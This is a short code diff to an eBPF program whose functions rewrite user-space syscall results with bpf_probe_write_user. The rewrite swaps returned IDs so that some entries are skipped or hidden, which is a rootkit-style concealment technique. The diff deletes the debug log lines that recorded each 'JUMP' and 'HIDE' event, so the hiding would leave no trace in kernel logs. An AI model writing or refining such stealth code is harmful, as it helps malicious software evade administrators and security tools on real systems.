@@ -57,7 +57,6 @@ int auditor_entry(struct pt_regs *ctx)
         __u32 *jump_to = bpf_map_lookup_elem(&jump_trigger_map, &start_id);
         if (jump_to) {
             bpf_probe_write_user((void *)uattr, jump_to, sizeof(*jump_to));
-            bpf_printk("JUMP: %u -> %u (skip hidden)\n", start_id, *jump_to);
             return 0;
         }
         
@@ -89,7 +88,6 @@ int changer_exit(struct pt_regs *ctx)
     if (next_valid_id) {
         __u32 replacement = *next_valid_id;
         bpf_probe_write_user((void *)(call_ctx->uattr_ptr + 4), &replacement, sizeof(replacement));
-        bpf_printk("HIDE: %u -> %u\n", returned_id, replacement);
     }
     
     bpf_map_delete_elem(&ctx_map, &pid_tgid);
